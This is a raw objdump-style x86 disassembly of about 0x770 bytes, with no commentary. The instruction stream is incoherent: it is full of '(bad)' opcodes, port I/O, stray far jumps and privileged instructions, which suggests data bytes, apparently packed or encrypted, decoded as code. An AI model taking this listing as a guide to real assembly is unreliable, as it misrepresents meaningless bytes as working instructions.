  41eae1:	xchg   ebp,eax
  41eae2:	idiv   ebx
  41eae4:	pop    esp
  41eae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eae6:	retf   0x34f1
  41eae9:	or     ch,bl
  41eaeb:	jnp    0x41eb00
  41eaed:	repz jmp 0x41ead5
  41eaf0:	or     edx,DWORD PTR [edx]
  41eaf2:	jbe    0x41eac3
  41eaf4:	sahf   
  41eaf5:	xor    al,0xc6
  41eaf7:	adc    ebx,DWORD PTR [esi]
  41eaf9:	adc    eax,0x824fe048
  41eafe:	sub    ah,dl
  41eb00:	cmp    ebx,esp
  41eb02:	(bad)  
  41eb03:	cmp    al,0xed
  41eb05:	outs   dx,BYTE PTR ds:[esi]
  41eb06:	in     al,dx
  41eb07:	push   cs
  41eb08:	and    BYTE PTR [ecx+ebp*2+0x6e],0x4c
  41eb0d:	adc    DWORD PTR [eax],0xdd33c0d4
  41eb13:	ins    BYTE PTR es:[edi],dx
  41eb14:	xlat   BYTE PTR ds:[ebx]
  41eb15:	out    0xb3,eax
  41eb17:	mov    ebp,0xa4802e0c
  41eb1c:	sahf   
  41eb1d:	fldcw  WORD PTR [edx+ecx*8+0x4d61f732]
  41eb24:	jb     0x41ead0
  41eb26:	dec    esp
  41eb27:	sbb    bl,bl
  41eb29:	add    BYTE PTR [esi-0x5c1e94a6],0x14
  41eb30:	cdq    
  41eb31:	fcom   QWORD PTR [edi]
  41eb33:	sbb    eax,0x2168e8a4
  41eb38:	jge    0x41eb2d
  41eb3a:	hlt    
  41eb3b:	leave  
  41eb3c:	xor    ch,ah
  41eb3e:	mov    bl,0x82
  41eb40:	das    
  41eb41:	imul   BYTE PTR [ecx]
  41eb43:	mov    esp,0x25668109
  41eb48:	lahf   
  41eb49:	pop    ecx
  41eb4a:	cmc    
  41eb4b:	push   edx
  41eb4c:	mov    edx,0xc933a0a2
  41eb51:	pop    esi
  41eb52:	pop    ebx
  41eb53:	push   edi
  41eb54:	sbb    eax,0x21491b66
  41eb59:	xor    al,ah
  41eb5b:	int    0xad
  41eb5d:	outs   dx,DWORD PTR ds:[esi]
  41eb5e:	adc    dl,bh
  41eb60:	ss into 
  41eb62:	(bad)  
  41eb64:	cmp    dl,BYTE PTR [eax+0x26b07928]
  41eb6a:	pop    ebp
  41eb6b:	fwait
  41eb6c:	dec    ecx
  41eb6d:	sbb    ah,dh
  41eb6f:	loope  0x41eb37
  41eb71:	mov    ebp,edi
  41eb73:	(bad)  
  41eb74:	hlt    
  41eb75:	repz icebp 
  41eb77:	xchg   ecx,eax
  41eb78:	inc    edx
  41eb79:	mov    esi,DWORD PTR [ecx+0x15]
  41eb7c:	jl     0x41ebf7
  41eb7e:	test   eax,0xdbc8274c
  41eb83:	es stos DWORD PTR es:[edi],eax
  41eb85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb86:	and    BYTE PTR [ebx-0x56],cl
  41eb89:	xchg   ebp,eax
  41eb8a:	sbb    ecx,DWORD PTR [edi]
  41eb8c:	bound  edi,QWORD PTR [eax+0x3e]
  41eb8f:	fild   WORD PTR [ecx+0x4628e82a]
  41eb95:	aas    
  41eb96:	shr    DWORD PTR [ebx+0x25],cl
  41eb99:	fiadd  WORD PTR ds:[esi+eiz*4]
  41eb9d:	mov    ah,0xe3
  41eb9f:	push   ecx
  41eba0:	or     bl,dl
  41eba2:	add    ebp,DWORD PTR [ebx+0x5f]
  41eba5:	hlt    
  41eba6:	push   edx
  41eba7:	repz jge 0x41ebd3
  41ebaa:	cmp    eax,0x3f5f3c33
  41ebaf:	push   esi
  41ebb0:	mov    edx,0xcbc2b137
  41ebb5:	shr    BYTE PTR [edi-0x2296d157],1
  41ebbb:	aam    0xb3
  41ebbd:	int    0xcf
  41ebbf:	out    0xf9,eax
  41ebc1:	outs   dx,BYTE PTR ds:[esi]
  41ebc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebc3:	jae    0x41eb7a
  41ebc5:	mov    DWORD PTR [edx-0x12],eax
  41ebc8:	and    al,0x4d
  41ebca:	fisubr DWORD PTR [ebx-0xb]
  41ebcd:	cli    
  41ebce:	add    DWORD PTR [esi-0xa],eax
  41ebd1:	arpl   WORD PTR [ebx],bp
  41ebd3:	fcmovbe st,st(1)
  41ebd5:	cld    
  41ebd6:	sbb    DWORD PTR [edx],ebp
  41ebd8:	pushf  
  41ebd9:	and    ecx,DWORD PTR [esi+0x7f]
  41ebdc:	xor    BYTE PTR [esi+edi*1-0x7e4c9022],0xe2
  41ebe4:	mov    ebp,0x474de1cb
  41ebe9:	retf   0x7536
  41ebec:	ins    DWORD PTR es:[edi],dx
  41ebed:	jmp    0x13ae5ba6
  41ebf2:	scas   al,BYTE PTR es:[edi]
  41ebf3:	stc    
  41ebf4:	ret    0xe8e7
  41ebf7:	out    dx,al
  41ebf8:	mov    BYTE PTR [esi-0x1f340082],al
  41ebfe:	retf   
  41ebff:	xchg   ebx,eax
  41ec00:	jmp    0x41eb8f
  41ec02:	jecxz  0x41ec7f
  41ec04:	jg     0x41ec3c
  41ec06:	test   ah,0x98
  41ec09:	or     eax,0x1498afae
  41ec0e:	jb     0x41ec5c
  41ec10:	in     eax,0xb1
  41ec12:	add    dh,al
  41ec14:	jl     0x41ec34
  41ec16:	leave  
  41ec17:	fidiv  DWORD PTR [edi+eax*1-0x2d73c896]
  41ec1e:	mov    cl,0xc8
  41ec21:	push   ds
  41ec22:	stos   DWORD PTR es:[di],eax
  41ec24:	mov    ebx,0xe8eea684
  41ec29:	inc    esp
  41ec2a:	inc    esp
  41ec2b:	jge    0x41ec51
  41ec2d:	push   0xaaec6638
  41ec32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec33:	push   ebx
  41ec34:	pop    ds
  41ec35:	jmp    0xc878:0x27973834
  41ec3c:	and    BYTE PTR [eax+0x2c7d70d4],dl
  41ec42:	push   ebx
  41ec43:	add    esp,0xf19be73e
  41ec49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec4a:	add    DWORD PTR [edi],esp
  41ec4c:	pop    ecx
  41ec4d:	add    bh,BYTE PTR [ebp-0x7bcd4a22]
  41ec53:	(bad)  
  41ec54:	sbb    eax,0xa2f85be1
  41ec59:	mov    eax,0x20e33df0
  41ec5e:	push   es
  41ec5f:	test   al,0x55
  41ec61:	or     eax,0x91dc7956
  41ec66:	xlat   BYTE PTR ds:[ebx]
  41ec67:	hlt    
  41ec68:	(bad)  
  41ec69:	jp     0x41ec7d
  41ec6b:	adc    cl,BYTE PTR [esi-0x3a094976]
  41ec71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec72:	mov    ah,dl
  41ec74:	push   esi
  41ec75:	mov    al,ds:0x28116425
  41ec7a:	aas    
  41ec7b:	and    BYTE PTR [edx],0x7e
  41ec7e:	sub    BYTE PTR [ebx-0x2979af87],cl
  41ec84:	aaa    
  41ec85:	jo     0x41ec4f
  41ec87:	es jmp 0x9f37:0x7847b333
  41ec8f:	add    edi,ecx
  41ec91:	sbb    ebp,DWORD PTR [edi-0x23]
  41ec94:	add    DWORD PTR [eax-0x43432ab8],ebp
  41ec9a:	mov    al,ds:0x1f3de60e
  41ec9f:	adc    DWORD PTR [eax-0x553bfaae],esp
  41eca5:	and    DWORD PTR gs:0x22703888,ecx
  41ecac:	adc    eax,0x57363fe8
  41ecb1:	adc    BYTE PTR [edi],dh
  41ecb3:	setle  bh
  41ecb6:	inc    edx
  41ecb7:	xchg   esi,eax
  41ecb8:	in     al,0x83
  41ecba:	mov    ch,0xb5
  41ecbc:	retf   0x8845
  41ecbf:	lea    ecx,[edx+0x2b4b9fc1]
  41ecc5:	(bad)  
  41ecc6:	in     eax,0x93
  41ecc8:	sti    
  41ecc9:	sbb    BYTE PTR [edx+0x28],bh
  41eccc:	popf   
  41eccd:	mov    edi,0xd99b411b
  41ecd2:	retf   0xb33f
  41ecd5:	inc    esi
  41ecd6:	dec    ebp
  41ecd7:	adc    bh,BYTE PTR [ebp-0x26]
  41ecda:	mov    ah,0xc6
  41ecdc:	push   ebx
  41ecdd:	xchg   edi,eax
  41ecde:	dec    esp
  41ecdf:	call   0x360b:0x1271685e
  41ece6:	inc    DWORD PTR [ebx-0x5ca8784a]
  41ecec:	sbb    bl,dh
  41ecee:	jae    0x41ecb3
  41ecf0:	loop   0x41ecf0
  41ecf2:	or     bh,cl
  41ecf4:	ret    0xefa6
  41ecf7:	inc    ebp
  41ecf8:	lock sbb ebx,0x7a62f239
  41ecff:	inc    edi
  41ed00:	mov    al,ds:0x2a844506
  41ed05:	xchg   edi,eax
  41ed06:	sbb    edi,0xffffffb1
  41ed09:	push   es
  41ed0a:	(bad)  
  41ed0c:	pop    ebp
  41ed0d:	sbb    al,0x2d
  41ed0f:	out    0x8c,al
  41ed11:	or     edx,DWORD PTR [eax-0x1a]
  41ed14:	stos   BYTE PTR es:[edi],al
  41ed15:	mov    DWORD PTR [esi],ebx
  41ed17:	sbb    DWORD PTR [esp+esi*4+0x76],esi
  41ed1b:	in     eax,dx
  41ed1c:	jae    0x41ecc4
  41ed1e:	mov    bl,0x43
  41ed20:	xchg   esi,eax
  41ed21:	xor    eax,0xfab84c57
  41ed26:	mov    dh,0x49
  41ed28:	add    eax,0xc8cec9d9
  41ed2d:	out    dx,eax
  41ed2e:	mov    ds:0x969bd555,al
  41ed33:	rol    dl,cl
  41ed35:	gs pop eax
  41ed37:	dec    esi
  41ed38:	aad    0x9f
  41ed3a:	and    eax,0x11f9193b
  41ed3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed40:	or     al,0x26
  41ed42:	into   
  41ed43:	stc    
  41ed44:	adc    BYTE PTR [ecx],ch
  41ed46:	or     eax,0xe2767967
  41ed4b:	fld    st(0)
  41ed4d:	icebp  
  41ed4e:	fwait
  41ed4f:	push   edx
  41ed50:	fcomi  st,st(1)
  41ed52:	jbe    0x41edd1
  41ed54:	mov    ch,0x9f
  41ed56:	idiv   DWORD PTR [edi+0x1d9e5900]
  41ed5c:	sbb    eax,0x91eea3d0
  41ed61:	push   edi
  41ed62:	push   0x684c4ffb
  41ed67:	lods   eax,DWORD PTR ds:[esi]
  41ed68:	shl    DWORD PTR ds:0xcb429d9e,1
  41ed6e:	fbld   TBYTE PTR cs:[esi+0x50a05b48]
  41ed75:	sub    al,0xd6
  41ed77:	cmp    DWORD PTR [ebp-0x52f920a2],edx
  41ed7d:	add    ah,BYTE PTR [edx+eax*4]
  41ed80:	clc    
  41ed81:	lods   eax,DWORD PTR ds:[esi]
  41ed82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed83:	add    al,al
  41ed85:	pop    esi
  41ed86:	fimul  WORD PTR [esi+esi*4-0x46cda405]
  41ed8d:	dec    ecx
  41ed8e:	dec    ebp
  41ed8f:	test   BYTE PTR [esi+0x6ad18163],bh
  41ed95:	jmp    0x41ed9c
  41ed97:	add    ebx,DWORD PTR [edi+0x44]
  41ed9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed9b:	or     al,0x5f
  41ed9d:	pop    ecx
  41ed9e:	mov    ebp,0xc316ccc3
  41eda3:	jp     0x41ed75
  41eda5:	inc    ebp
  41eda6:	pop    esp
  41eda7:	fnsave [eax+0x25c8b69e]
  41edad:	pop    edi
  41edae:	push   edi
  41edaf:	lds    edx,FWORD PTR [edi-0xa]
  41edb2:	ret    0x1514
  41edb5:	hlt    
  41edb6:	and    esi,0xffffff9b
  41edb9:	jnp    0x41ed9b
  41edbb:	aad    0xf3
  41edbd:	test   al,0x91
  41edbf:	sbb    eax,0xc5d6cecf
  41edc4:	je     0x41ede4
  41edc6:	lods   eax,DWORD PTR ds:[esi]
  41edc7:	and    ebx,esp
  41edc9:	mov    bh,0x64
  41edcb:	dec    ebp
  41edcc:	into   
  41edcd:	mov    eax,ds:0x22b7e16f
  41edd2:	bswap  esi
  41edd4:	aam    0xef
  41edd6:	loopne 0x41ed83
  41edd8:	ja     0x41ed99
  41edda:	ja     0x41edfc
  41eddc:	jmp    0x41ee15
  41edde:	cld    
  41eddf:	mov    esp,0xa98dfa29
  41ede4:	mov    bl,0x3a
  41ede7:	xor    DWORD PTR [ebx-0x6],ebx
  41edea:	sub    BYTE PTR [ebx],bl
  41edec:	in     al,0xd9
  41edee:	add    BYTE PTR [ebp+0x10],0x53
  41edf2:	xchg   esi,eax
  41edf3:	mov    fs,WORD PTR [ebp+0x88568d8]
  41edf9:	xchg   BYTE PTR es:[edi+0x31a41edf],bh
  41ee00:	stc    
  41ee01:	iret   
  41ee02:	inc    eax
  41ee03:	clc    
  41ee04:	test   ax,0x281b
  41ee08:	pop    ebp
  41ee09:	stos   BYTE PTR es:[edi],al
  41ee0a:	std    
  41ee0b:	pushf  
  41ee0c:	fild   DWORD PTR [ebp-0x67]
  41ee0f:	or     eax,0xd1cb031c
  41ee14:	lods   eax,DWORD PTR ds:[esi]
  41ee15:	mov    ecx,DWORD PTR [ebp+0x7737a468]
  41ee1b:	cmp    esp,DWORD PTR [edx]
  41ee1d:	dec    ebp
  41ee1e:	out    dx,al
  41ee1f:	(bad)  
  41ee20:	aam    0x4
  41ee22:	clc    
  41ee23:	cld    
  41ee24:	jbe    0x41edd0
  41ee26:	outs   dx,BYTE PTR ds:[esi]
  41ee27:	sbb    bh,BYTE PTR [ebx+0x79249a5d]
  41ee2d:	mov    esi,0x47547f6b
  41ee32:	(bad)  
  41ee33:	cmp    BYTE PTR [eax+0x14982e81],bh
  41ee39:	popf   
  41ee3a:	sahf   
  41ee3b:	add    BYTE PTR [edx+0x1f20b0d0],bl
  41ee41:	xchg   ebp,eax
  41ee42:	xchg   edi,eax
  41ee43:	out    dx,eax
  41ee44:	jle    0x41eeac
  41ee46:	arpl   WORD PTR [ebp+ebx*2+0x33f4302d],cx
  41ee4d:	or     ah,al
  41ee4f:	aam    0x7c
  41ee51:	loop   0x41edd3
  41ee53:	out    dx,al
  41ee54:	cmp    BYTE PTR [ecx],cl
  41ee56:	call   0x6719e1e
  41ee5b:	sub    bl,ah
  41ee5d:	jae    0x41edf1
  41ee5f:	mov    edx,0xe2d5510e
  41ee64:	xchg   esp,eax
  41ee65:	mov    ah,BYTE PTR [eax+0x3df6d75a]
  41ee6b:	add    al,0x85
  41ee6d:	lahf   
  41ee6e:	mov    esi,0xfc6b5013
  41ee73:	or     edx,DWORD PTR [esp+edi*1-0x48874e05]
  41ee7a:	mov    edi,0xff10641b
  41ee7f:	and    ecx,DWORD PTR [edi]
  41ee81:	sbb    cl,BYTE PTR [ebp-0xd]
  41ee84:	cli    
  41ee85:	fcmovb st,st(1)
  41ee87:	jne    0x41ee37
  41ee89:	xchg   ebx,eax
  41ee8a:	add    al,0x86
  41ee8c:	test   eax,0x3dc9912b
  41ee91:	repz add cl,BYTE PTR [edi-0x4b]
  41ee95:	push   ebx
  41ee96:	pop    ds
  41ee97:	aam    0xaa
  41ee99:	mov    ecx,0x14afc002
  41ee9e:	out    dx,al
  41ee9f:	lods   al,BYTE PTR ds:[esi]
  41eea0:	inc    edi
  41eea1:	xchg   edx,eax
  41eea2:	adc    al,0x65
  41eea4:	mov    BYTE PTR [ecx],al
  41eea6:	cmp    eax,0x380af7c5
  41eeab:	or     al,0xf8
  41eead:	pop    ebx
  41eeae:	ret    0x90e4
  41eeb1:	imul   ecx,DWORD PTR [eax-0x7209db28],0xd666c9bf
  41eebb:	xchg   edi,eax
  41eebc:	sbb    BYTE PTR [edi],bh
  41eebe:	das    
  41eebf:	cmp    dl,BYTE PTR [eax-0x77]
  41eec2:	or     bl,BYTE PTR [edi]
  41eec4:	push   DWORD PTR [edx]
  41eec6:	jge    0x41ee8d
  41eec8:	ins    DWORD PTR es:[edi],dx
  41eec9:	(bad)  
  41eeca:	mov    edi,0x3fcaf3e1
  41eecf:	xor    eax,0xbc588451
  41eed4:	pop    cx
  41eed6:	pop    ecx
  41eed7:	push   ecx
  41eed8:	mov    cl,0x31
  41eeda:	(bad)  
  41eedb:	pop    ebp
  41eedc:	push   esp
  41eedd:	lds    esp,FWORD PTR [edi-0x65]
  41eee0:	adc    al,0x19
  41eee2:	xchg   bh,ch
  41eee4:	(bad)  
  41eee5:	pusha  
  41eee6:	sub    BYTE PTR [edi+0x59d2f61b],0xa7
  41eeed:	jle    0x41eee6
  41eeef:	jae    0x41eee0
  41eef1:	adc    ah,0x81
  41eef4:	or     bh,BYTE PTR [edx+0x54]
  41eef7:	pop    ds
  41eef8:	mov    ds:0x45198298,eax
  41eefd:	adc    BYTE PTR [ebx+0x3cdad425],ch
  41ef03:	jmp    0xb571c8d1
  41ef08:	mov    ah,0x4d
  41ef0a:	das    
  41ef0b:	inc    ebp
  41ef0c:	add    eax,0xea8ed097
  41ef11:	outs   dx,BYTE PTR ds:[esi]
  41ef12:	lods   eax,DWORD PTR ds:[esi]
  41ef13:	dec    eax
  41ef14:	fistp  WORD PTR [esi]
  41ef16:	pop    es
  41ef17:	mov    ds:0x21710ec5,al
  41ef1c:	neg    DWORD PTR [ecx+0x60]
  41ef1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef20:	sub    ebp,0x6aade4c2
  41ef26:	mov    bh,0x95
  41ef28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef29:	sbb    ch,BYTE PTR [edx-0x46]
  41ef2c:	mov    eax,ds:0x1221a197
  41ef31:	dec    ebp
  41ef32:	sub    BYTE PTR [ecx],0x21
  41ef35:	and    edi,eax
  41ef37:	sbb    BYTE PTR [si],cl
  41ef3a:	push   esp
  41ef3b:	out    dx,al
  41ef3c:	rcr    BYTE PTR [edi],1
  41ef3e:	fnsave [edx+0x16]
  41ef41:	mov    ebp,0x6ad1037
  41ef46:	pusha  
  41ef47:	add    esi,DWORD PTR [edx+0x5a301edf]
  41ef4d:	pop    ds
  41ef4e:	push   esi
  41ef4f:	cdq    
  41ef50:	sar    DWORD PTR [edi],cl
  41ef52:	or     BYTE PTR [ebx-0x1c],bh
  41ef55:	xor    eax,0xac6b496b
  41ef5a:	adc    edx,DWORD PTR [esi+0x65]
  41ef5d:	jb     0x41efc0
  41ef5f:	lea    esi,[esi]
  41ef61:	fisub  WORD PTR [bp+di]
  41ef64:	das    
  41ef65:	mov    esp,ebp
  41ef67:	lea    edx,[eax-0x618da418]
  41ef6d:	mov    ah,0x8a
  41ef6f:	mov    esp,0xe6498f56
  41ef74:	fwait
  41ef75:	pop    edi
  41ef76:	xchg   BYTE PTR [ebx-0x1d6920fc],ah
  41ef7c:	outs   dx,BYTE PTR ds:[esi]
  41ef7d:	dec    esi
  41ef7e:	inc    ebp
  41ef7f:	add    edx,edi
  41ef81:	mov    dh,0x91
  41ef83:	jo     0x41efe9
  41ef85:	xchg   edx,eax
  41ef86:	imul   ebp,DWORD PTR [ebp+0x36],0xe1fe8bc9
  41ef8d:	mul    BYTE PTR [edx-0x75]
  41ef90:	dec    edi
  41ef91:	fwait
  41ef92:	lods   al,BYTE PTR ds:[esi]
  41ef93:	sar    BYTE PTR [edx],1
  41ef95:	leave  
  41ef96:	sub    al,0x87
  41ef98:	xchg   esi,eax
  41ef99:	in     eax,dx
  41ef9a:	push   edx
  41ef9b:	lds    ecx,FWORD PTR [edi]
  41ef9d:	xor    BYTE PTR [ecx-0x77],al
  41efa0:	int3   
  41efa1:	(bad)  
  41efa3:	dec    ebx
  41efa4:	das    
  41efa5:	sub    cl,BYTE PTR [eax-0x6b]
  41efa8:	jp     0x41ef78
  41efaa:	stc    
  41efab:	push   0xffffff90
  41efad:	add    al,0xdd
  41efaf:	add    BYTE PTR [edi+0x45],ah
  41efb2:	dec    esp
  41efb3:	push   eax
  41efb4:	out    dx,eax
  41efb5:	out    0x6e,al
  41efb7:	pop    ds
  41efb8:	mov    esi,DWORD PTR fs:[edi-0x46412489]
  41efbf:	jns    0x41ef90
  41efc1:	add    ah,BYTE PTR [ebx-0x30e2dde6]
  41efc7:	xchg   ebx,eax
  41efc8:	je     0x41ef67
  41efca:	inc    esp
  41efcb:	and    DWORD PTR [ecx+ecx*1-0x59],0x27
  41efd0:	jnp    0x41f026
  41efd2:	sub    BYTE PTR [edi],al
  41efd4:	cmp    edi,DWORD PTR [ecx+0x7c]
  41efd7:	sbb    BYTE PTR [ebx],bh
  41efd9:	mov    dh,0x8e
  41efdb:	and    BYTE PTR [ebx+0x77],ch
  41efde:	std    
  41efdf:	sub    eax,0xf8d366be
  41efe4:	dec    edi
  41efe5:	xchg   edx,eax
  41efe6:	pop    es
  41efe7:	mov    ah,0xa3
  41efe9:	add    eax,0x23c53578
  41efee:	enter  0xe63e,0x73
  41eff2:	jle    0x41f01d
  41eff4:	sub    bl,BYTE PTR [esi+0x10]
  41eff7:	jbe    0x41efe5
  41eff9:	mov    ecx,0x6e69f0f2
  41effe:	xor    DWORD PTR ds:0x645e155c,eax
  41f004:	pop    ds
  41f005:	cmp    eax,0x2d818143
  41f00a:	lock addr16 jo 0x41f083
  41f00e:	jg     0x41f006
  41f010:	into   
  41f011:	sbb    DWORD PTR [ecx+edi*8+0x500ff1e2],edx
  41f018:	aad    0xfb
  41f01a:	push   ecx
  41f01b:	fwait
  41f01c:	add    edx,DWORD PTR [ebp-0x6aabffb9]
  41f022:	mov    eax,ds:0x126982a4
  41f027:	pop    edx
  41f028:	push   0xfffffff9
  41f02a:	pop    edi
  41f02b:	xchg   esi,eax
  41f02c:	scas   eax,DWORD PTR es:[edi]
  41f02d:	mov    bl,BYTE PTR ds:0x2b02589e
  41f033:	(bad)  
  41f034:	std    
  41f035:	jo     0x41f048
  41f037:	xlat   BYTE PTR ds:[ebx]
  41f038:	aam    0x40
  41f03a:	stos   BYTE PTR es:[edi],al
  41f03b:	outs   dx,DWORD PTR ds:[esi]
  41f03c:	lods   al,BYTE PTR ds:[esi]
  41f03d:	into   
  41f03e:	mov    dl,0x46
  41f040:	cmp    eax,0xf3bcf67f
  41f045:	(bad)  
  41f046:	clc    
  41f047:	mov    bl,0x5d
  41f049:	fnstcw WORD PTR [eax]
  41f04b:	or     edx,edi
  41f04d:	adc    edx,DWORD PTR [edx-0x79]
  41f050:	add    BYTE PTR [eax+0x15],0x5c
  41f054:	sbb    DWORD PTR [eax+esi*8-0x5f6b5df6],ebp
  41f05b:	mov    ebx,0x19c92e20
  41f060:	in     eax,dx
  41f061:	mov    esp,0xb977b8f5
  41f066:	and    DWORD PTR [ecx-0x2aa68459],0xe6dc21f0
  41f070:	sar    edx,1
  41f072:	cwde   
  41f073:	push   0x91d5b126
  41f078:	ret    
  41f079:	jg     0x41f09b
  41f07b:	xchg   dl,ch
  41f07d:	frstor [eax-0x1]
  41f080:	dec    edx
  41f081:	or     cl,dh
  41f083:	xchg   BYTE PTR [edx],bh
  41f085:	mov    DWORD PTR [eax+0x5040a236],ebx
  41f08b:	jge    0x41f02b
  41f08d:	sub    al,BYTE PTR [ecx-0x7b]
  41f090:	ins    DWORD PTR es:[edi],dx
  41f091:	jbe    0x41f05a
  41f093:	dec    eax
  41f094:	mov    eax,ds:0xae452069
  41f099:	mov    ah,0x2c
  41f09b:	call   0xa859:0xb1f8035
  41f0a2:	pop    ds
  41f0a3:	xor    ch,ah
  41f0a5:	xchg   ebx,eax
  41f0a6:	not    esp
  41f0a8:	rcr    ah,cl
  41f0aa:	fldenv [esi+ebx*2-0x60dcecdd]
  41f0b1:	addr16 dec eax
  41f0b3:	mov    ch,dh
  41f0b5:	xor    ch,BYTE PTR [ebp-0x29c7839b]
  41f0bb:	das    
  41f0bc:	(bad)  
  41f0bf:	outs   dx,BYTE PTR ds:[esi]
  41f0c0:	fisttp DWORD PTR [ebx+0x674da641]
  41f0c6:	ret    0x62e8
  41f0c9:	call   0x7ce8d33c
  41f0ce:	inc    esp
  41f0cf:	icebp  
  41f0d0:	lahf   
  41f0d1:	push   esi
  41f0d2:	or     DWORD PTR [edi+0xab88995],esp
  41f0d8:	cld    
  41f0d9:	mov    cs,WORD PTR [ebx]
  41f0db:	sbb    DWORD PTR [ecx+0xf9772b5],edx
  41f0e1:	jns    0x41f07a
  41f0e3:	xor    BYTE PTR [edx],bh
  41f0e5:	cmp    al,0x5f
  41f0e7:	retf   0x3c89
  41f0ea:	loopne 0x41f0c3
  41f0ec:	lock sbb eax,0xa4302975
  41f0f2:	ficom  WORD PTR [esp+esi*1-0x59]
  41f0f6:	scas   al,BYTE PTR es:[edi]
  41f0f7:	inc    edi
  41f0f8:	int    0x2
  41f0fa:	xchg   edx,eax
  41f0fb:	jo     0x41f14d
  41f0fd:	rol    al,cl
  41f0ff:	mov    edi,0x7f1fee3d
  41f104:	and    dh,dl
  41f106:	neg    BYTE PTR [ecx-0x2f]
  41f109:	jl     0x41f143
  41f10b:	sub    esi,ecx
  41f10d:	mov    edx,0x9a1cc414
  41f112:	mov    ebp,0xdf30b6bb
  41f117:	frstor [edx+0x7c8c3e7d]
  41f11d:	fs fcomip st,st(6)
  41f120:	pop    esi
  41f121:	mov    dh,0xf1
  41f123:	xchg   BYTE PTR [ebp+0x58],dh
  41f126:	aaa    
  41f127:	mov    edi,0xa42ae341
  41f12c:	push   ecx
  41f12d:	push   DWORD PTR ds:0x945e6429
  41f133:	ds dec ebx
  41f135:	pop    ss
  41f136:	cmc    
  41f137:	iret   
  41f138:	and    DWORD PTR [esi],edx
  41f13a:	xor    cl,BYTE PTR [esi]
  41f13c:	setae  BYTE PTR [ecx-0x40a9d47a]
  41f143:	jp     0x41f174
  41f145:	add    al,BYTE PTR [ebp+0x7e08b7a5]
  41f14b:	add    eax,0x7ea298ea
  41f150:	(bad)  
  41f151:	stc    
  41f152:	stos   BYTE PTR es:[edi],al
  41f153:	retf   0xf91e
  41f156:	es xor eax,0x535f8c94
  41f15c:	jecxz  0x41f120
  41f15e:	adc    esi,DWORD PTR [ecx+eax*8]
  41f161:	sub    ah,bl
  41f163:	lock push ebp
  41f165:	pop    eax
  41f166:	mov    eax,ds:0x96b9416e
  41f16b:	cld    
  41f16c:	ret    
  41f16d:	jb     0x41f10e
  41f16f:	leave  
  41f170:	xchg   edi,eax
  41f171:	sahf   
  41f172:	jbe    0x41f1ee
  41f174:	mov    esi,0x49352d1f
  41f179:	push   cs
  41f17a:	cmp    DWORD PTR [esp+eax*1-0x2b],esi
  41f17e:	xor    DWORD PTR [eax+0x52],ebx
  41f181:	jl     0x41f12c
  41f183:	scas   al,BYTE PTR es:[edi]
  41f184:	cmp    eax,0xb9ddbad9
  41f189:	fdiv   DWORD PTR [edi+0x6a99146]
  41f18f:	mov    esp,0x91f06b0f
  41f194:	xor    eax,0x394ee78a
  41f199:	mov    BYTE PTR [ebp-0x53],dh
  41f19c:	mov    bh,0x55
  41f19e:	sub    eax,0x7e1ede62
  41f1a3:	shl    ah,cl
  41f1a5:	das    
  41f1a6:	or     DWORD PTR [ebx],eax
  41f1a8:	sbb    eax,0xbedab9f
  41f1ad:	sub    al,0x51
  41f1af:	xchg   esi,eax
  41f1b0:	adc    al,0xe2
  41f1b2:	into   
  41f1b3:	or     eax,0xaec1183d
  41f1b8:	bound  ebp,QWORD PTR [esi]
  41f1ba:	nop
  41f1bb:	mov    eax,0x7c1635cf
  41f1c0:	sub    eax,0xdef76d54
  41f1c5:	mov    ecx,edx
  41f1c7:	enter  0xa66,0x6d
  41f1cb:	add    DWORD PTR [ebx-0x4e],esi
  41f1ce:	outs   dx,BYTE PTR ds:[esi]
  41f1cf:	test   al,0x6
  41f1d1:	(bad)  [ebp-0x7ac4e634]
  41f1d7:	cmp    DWORD PTR [ecx],edi
  41f1d9:	repz fwait
  41f1db:	xor    bh,0xf3
  41f1de:	mov    ah,BYTE PTR [esi]
  41f1e0:	repnz nop
  41f1e2:	out    0xa7,eax
  41f1e4:	add    al,0xe5
  41f1e6:	add    esp,0xffffffe8
  41f1e9:	mov    ss,WORD PTR [edx]
  41f1eb:	add    ebp,DWORD PTR [esi+0x18]
  41f1ee:	retf   
  41f1ef:	jge    0x41f1cc
  41f1f1:	mov    ecx,0xf6b68f29
  41f1f6:	jb     0x41f252
  41f1f8:	stos   DWORD PTR es:[edi],eax
  41f1f9:	lods   al,BYTE PTR ds:[esi]
  41f1fa:	fsubr  DWORD PTR ds:0x27733802
  41f200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f201:	dec    esp
  41f202:	scas   al,BYTE PTR es:[edi]
  41f203:	test   dh,ah
  41f205:	outs   dx,DWORD PTR ds:[esi]
  41f206:	inc    eax
  41f207:	jb     0x41f1d8
  41f209:	xor    eax,0x1724a704
  41f20e:	mov    BYTE PTR [ecx],bh
  41f210:	mov    eax,ds:0x575a6074
  41f215:	lods   al,BYTE PTR ds:[esi]
  41f216:	pusha  
  41f217:	icebp  
  41f218:	sub    DWORD PTR [eax+0x3e],esi
  41f21b:	stos   BYTE PTR es:[edi],al
  41f21c:	mov    ebp,0xeaa9d982
  41f221:	les    ebp,FWORD PTR [ecx+edx*2-0x5c]
  41f225:	mov    esp,DWORD PTR [ebp-0x7f]
  41f228:	fwait
  41f229:	and    eax,0x6f995cc2
  41f22e:	xor    eax,0xce3d543e
  41f233:	scas   al,BYTE PTR es:[edi]
  41f234:	lods   al,BYTE PTR ds:[esi]
  41f235:	(bad)  
  41f236:	xor    BYTE PTR [esi],bh
  41f238:	jo     0x41f1df
  41f23a:	popf   
  41f23b:	mov    ch,BYTE PTR [ecx+esi*1]
  41f23e:	or     ebp,edx
  41f240:	or     DWORD PTR [esp+ecx*2-0x4f7e7ba],edi
  41f247:	aaa    
  41f248:	mov    bl,ah
  41f24a:	sbb    DWORD PTR [edi+0x3173ac9d],esi
  41f250:	push   esp
